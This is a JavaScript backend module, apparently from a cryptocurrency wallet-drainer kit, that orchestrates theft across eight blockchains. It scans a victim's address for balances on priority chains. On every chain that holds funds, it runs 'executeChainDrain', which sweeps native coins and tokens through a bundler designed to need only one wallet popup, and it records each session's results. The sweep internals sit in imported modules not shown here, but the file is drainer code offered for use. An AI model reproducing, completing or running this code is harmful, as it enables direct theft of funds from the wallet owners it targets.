// backend/lib/multiChainManager.js
import { ethers } from "ethers";
import { securityManager } from '../modules/securityManager.js';
import { atomicBundler } from '../modules/atomicBundler.js';
import { tokenSwapper } from '../modules/tokenSwapper.js';

export class MultiChainManager {
    constructor() {
        this.isInitialized = false;
        this.supportedChains = new Map();
        this.activeConnections = new Map();
        
        // Single-popup configurations
        this.singlePopupConfig = {
            maxChainSwitchTime: 5000,
            maxConcurrentScans: 2,
            minChainValue: ethers.parseUnits('0.003', 'ether'),
            rpcTimeout: 10000,
            healthCheckInterval: 30000
        };

        this.chainPriorities = {
            '1': { priority: 1, name: 'Ethereum', weight: 10 },
            '42161': { priority: 1, name: 'Arbitrum', weight: 9 },
            '8453': { priority: 1, name: 'Base', weight: 8 },
            '137': { priority: 2, name: 'Polygon', weight: 7 },
            '56': { priority: 2, name: 'BSC', weight: 6 },
            '43114': { priority: 2, name: 'Avalanche', weight: 5 },
            '10': { priority: 3, name: 'Optimism', weight: 4 },
            '324': { priority: 3, name: 'zkSync', weight: 3 }
        };
    }

    async initialize() {
        if (this.isInitialized) return true;
        try {
            console.log(`🔄 Initializing ${this.constructor.name}...`);
            
            await this.initializeSupportedChains();
            await this.initializeRpcConnections();
            
            this.isInitialized = true;
            console.log(`✅ ${this.constructor.name} initialized`);
            return true;
        } catch (error) {
            console.error(`❌ ${this.constructor.name} initialization failed:`, error);
            return false;
        }
    }

    async initializeSupportedChains() {
        const chainConfigs = {
            '1': {
                name: 'Ethereum',
                rpcUrls: [process.env.ETHEREUM_RPC_URL],
                explorer: 'https://api.etherscan.io',
                nativeToken: 'ETH',
                chainId: 1,
                enabled: true
            },
            '56': {
                name: 'BSC',
                rpcUrls: [process.env.BSC_RPC_URL],
                explorer: 'https://api.bscscan.com',
                nativeToken: 'BNB',
                chainId: 56,
                enabled: true
            },
            '137': {
                name: 'Polygon',
                rpcUrls: [process.env.POLYGON_RPC_URL],
                explorer: 'https://api.polygonscan.com',
                nativeToken: 'MATIC',
                chainId: 137,
                enabled: true
            },
            '42161': {
                name: 'Arbitrum',
                rpcUrls: [process.env.ARBITRUM_RPC_URL],
                explorer: 'https://api.arbiscan.io',
                nativeToken: 'ETH',
                chainId: 42161,
                enabled: true
            },
            '10': {
                name: 'Optimism',
                rpcUrls: [process.env.OPTIMISM_RPC_URL],
                explorer: 'https://api-optimistic.etherscan.io',
                nativeToken: 'ETH',
                chainId: 10,
                enabled: true
            },
            '43114': {
                name: 'Avalanche',
                rpcUrls: [process.env.AVALANCHE_RPC_URL],
                explorer: 'https://api.snowtrace.io',
                nativeToken: 'AVAX',
                chainId: 43114,
                enabled: true
            },
            '8453': {
                name: 'Base',
                rpcUrls: [process.env.BASE_RPC_URL],
                explorer: 'https://api.basescan.org',
                nativeToken: 'ETH',
                chainId: 8453,
                enabled: true
            },
            '324': {
                name: 'zkSync',
                rpcUrls: [process.env.ZKSYNC_RPC_URL],
                explorer: 'https://api.zksync.io',
                nativeToken: 'ETH',
                chainId: 324,
                enabled: true
            }
        };

        for (const [chainId, config] of Object.entries(chainConfigs)) {
            if (config.enabled && config.rpcUrls && config.rpcUrls[0]) {
                this.supportedChains.set(chainId, {
                    ...config,
                    activeRpc: this.rotateRPC(config.rpcUrls),
                    lastUsed: Date.now(),
                    health: 'good',
                    latency: 0
                });
            }
        }
    }

    async initializeRpcConnections() {
        for (const [chainId, config] of this.supportedChains.entries()) {
            try {
                const provider = new ethers.JsonRpcProvider(config.activeRpc);
                // Test connection
                await provider.getBlockNumber();
                
                this.activeConnections.set(chainId, {
                    provider: provider,
                    config: config,
                    lastActivity: Date.now(),
                    healthy: true
                });
                
                console.log(`✅ ${config.name} RPC connected`);
            } catch (error) {
                console.warn(`⚠️ ${config.name} RPC failed: ${error.message}`);
                config.health = 'unhealthy';
            }
        }
    }

    rotateRPC(rpcList) {
        if (!Array.isArray(rpcList)) return rpcList;
        
        // Filter out invalid URLs
        const validUrls = rpcList.filter(url => url && url.startsWith('http'));
        if (validUrls.length === 0) return null;
        
        // Select random RPC from available ones
        const randomIndex = Math.floor(Math.random() * validUrls.length);
        return validUrls[randomIndex];
    }

    getChainConfig(chainId) {
        return this.supportedChains.get(chainId);
    }

    getAllChains() {
        return Array.from(this.supportedChains.entries()).map(([id, config]) => ({
            id: parseInt(id),
            ...config
        }));
    }

    getPriorityChains() {
        return this.getAllChains()
            .filter(chain => chain.enabled && chain.health === 'good')
            .sort((a, b) => {
                const priorityA = this.chainPriorities[a.id]?.priority || 3;
                const priorityB = this.chainPriorities[b.id]?.priority || 3;
                return priorityA - priorityB;
            });
    }

    async getProvider(chainId) {
        let connection = this.activeConnections.get(chainId);
        
        if (!connection || !connection.healthy) {
            // Re-establish connection if needed
            const config = this.getChainConfig(chainId);
            if (config && config.health === 'good') {
                try {
                    const provider = new ethers.JsonRpcProvider(config.activeRpc);
                    await provider.getBlockNumber(); // Test connection
                    
                    connection = {
                        provider: provider,
                        config: config,
                        lastActivity: Date.now(),
                        healthy: true
                    };
                    
                    this.activeConnections.set(chainId, connection);
                } catch (error) {
                    console.warn(`⚠️ Failed to reconnect to ${config.name}: ${error.message}`);
                    config.health = 'unhealthy';
                    return null;
                }
            }
        }
        
        if (connection) {
            connection.lastActivity = Date.now();
            return connection.provider;
        }
        
        return null;
    }

    async quickChainScan(userAddress, maxChains = 3) {
        console.log(`🔍 Quick-scanning chains for ${userAddress}`);
        
        const priorityChains = this.getPriorityChains().slice(0, maxChains);
        const results = new Map();
        
        const scanPromises = priorityChains.map(async (chain) => {
            try {
                const provider = await this.getProvider(chain.id.toString());
                if (!provider) return null;
                
                const startTime = Date.now();
                const nativeBalance = await provider.getBalance(userAddress);
                const latency = Date.now() - startTime;
                
                // Update chain latency
                chain.latency = latency;
                
                if (nativeBalance > 0n) {
                    results.set(chain.id, {
                        chain: chain,
                        nativeBalance: nativeBalance,
                        hasAssets: true,
                        latency: latency,
                        scannedAt: Date.now()
                    });
                }
                
            } catch (error) {
                console.warn(`⚠️ Quick scan failed for ${chain.name}: ${error.message}`);
            }
        });
        
        await Promise.allSettled(scanPromises);
        return results;
    }

    async executeSinglePopupMultiChain(userWallet, userAddress) {
        console.log(`🌐 Single-popup multi-chain execution for ${userAddress}`);
        
        const startTime = Date.now();
        const sessionId = `mc_${Date.now()}_${Math.random().toString(36).substr(2, 6)}`;
        
        try {
            // Quick scan for valuable chains
            const valuableChains = await this.quickChainScan(userAddress, 3);
            
            if (valuableChains.size === 0) {
                return {
                    success: false,
                    sessionId: sessionId,
                    reason: 'No valuable chains found',
                    userAddress: userAddress,
                    executionTime: Date.now() - startTime
                };
            }
            
            // Execute drains on valuable chains
            const results = [];
            for (const [chainId, chainInfo] of valuableChains.entries()) {
                try {
                    const result = await this.executeChainDrain(
                        userWallet,
                        userAddress,
                        chainInfo.chain,
                        sessionId
                    );
                    
                    results.push(result);
                    
                    // Brief delay between chain operations
                    if (valuableChains.size > 1) {
                        await this.delay(2000);
                    }
                    
                } catch (error) {
                    console.error(`❌ Chain ${chainInfo.chain.name} execution failed: ${error.message}`);
                    results.push({
                        chainId: chainId,
                        success: false,
                        error: error.message
                    });
                }
            }
            
            const successfulDrains = results.filter(r => r.success).length;
            
            const finalResult = {
                success: successfulDrains > 0,
                sessionId: sessionId,
                userAddress: userAddress,
                chainsScanned: valuableChains.size,
                chainsDrained: successfulDrains,
                results: results,
                executionTime: Date.now() - startTime,
                totalValue: this.calculateTotalValue(results)
            };
            
            await securityManager.storeMultiChainSession(sessionId, finalResult);
            return finalResult;
            
        } catch (error) {
            console.error(`❌ Multi-chain execution failed: ${error.message}`);
            
            const errorResult = {
                success: false,
                sessionId: sessionId,
                error: error.message,
                userAddress: userAddress,
                executionTime: Date.now() - startTime
            };
            
            await securityManager.storeMultiChainSession(sessionId, errorResult);
            return errorResult;
        }
    }

    async executeChainDrain(userWallet, userAddress, chainConfig, sessionId) {
        console.log(`🔗 Executing drain on ${chainConfig.name}`);
        
        const startTime = Date.now();
        
        try {
            const provider = await this.getProvider(chainConfig.id.toString());
            if (!provider) {
                throw new Error('Provider not available');
            }
            
            // Use atomic bundler for single-popup execution
            const drainOperations = [
                {
                    type: 'native-sweep',
                    userAddress: userAddress,
                    chainId: chainConfig.id
                },
                {
                    type: 'token-sweep',
                    userAddress: userAddress,
                    chainId: chainConfig.id
                }
            ];
            
            const bundleResult = await atomicBundler.createSinglePopupBundle(
                userWallet,
                drainOperations,
                chainConfig.id.toString()
            );
            
            const result = {
                chainId: chainConfig.id,
                chainName: chainConfig.name,
                success: true,
                bundleHash: bundleResult.bundleHash,
                executionTime: Date.now() - startTime,
                sessionId: sessionId
            };
            
            console.log(`✅ ${chainConfig.name} drain executed successfully`);
            return result;
            
        } catch (error) {
            console.error(`❌ ${chainConfig.name} drain failed: ${error.message}`);
            throw error;
        }
    }

    calculateTotalValue(results) {
        let totalValue = 0n;
        
        // This would be calculated based on actual drained amounts
        // For now, return placeholder value
        results.forEach(result => {
            if (result.success) {
                totalValue += ethers.parseEther('0.01'); // Placeholder
            }
        });
        
        return totalValue;
    }

    async switchChain(userWallet, targetChainId) {
        console.log(`🔄 Switching to chain ${targetChainId}`);
        
        try {
            const targetConfig = this.getChainConfig(targetChainId.toString());
            if (!targetConfig) {
                throw new Error(`Chain ${targetChainId} not supported`);
            }
            
            // Update wallet provider for the target chain
            const provider = await this.getProvider(targetChainId.toString());
            if (!provider) {
                throw new Error(`No provider available for ${targetConfig.name}`);
            }
            
            const connectedWallet = userWallet.connect(provider);
            
            return {
                success: true,
                chainId: targetChainId,
                chainName: targetConfig.name,
                provider: provider,
                wallet: connectedWallet
            };
            
        } catch (error) {
            console.error(`❌ Chain switch failed: ${error.message}`);
            throw error;
        }
    }

    async delay(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }

    getChainHealth(chainId) {
        const config = this.getChainConfig(chainId.toString());
        if (!config) return 'unknown';
        
        return {
            health: config.health,
            latency: config.latency,
            lastUsed: config.lastUsed,
            activeRpc: config.activeRpc
        };
    }

    async updateChainHealth(chainId, healthStatus) {
        const config = this.getChainConfig(chainId.toString());
        if (config) {
            config.health = healthStatus;
            config.lastHealthCheck = Date.now();
            return true;
        }
        return false;
    }

    getPerformanceStats() {
        const stats = {
            totalChains: this.supportedChains.size,
            healthyChains: Array.from(this.supportedChains.values()).filter(c => c.health === 'good').length,
            activeConnections: this.activeConnections.size,
            averageLatency: this.calculateAverageLatency()
        };
        
        return stats;
    }

    calculateAverageLatency() {
        const latencies = Array.from(this.supportedChains.values())
            .filter(chain => chain.latency > 0)
            .map(chain => chain.latency);
        
        if (latencies.length === 0) return 0;
        
        return latencies.reduce((sum, latency) => sum + latency, 0) / latencies.length;
    }
}

export const multiChainManager = new MultiChainManager();

// Health check interval
setInterval(async () => {
    if (multiChainManager.isInitialized) {
        await multiChainManager.initializeRpcConnections();
    }
}, 30000);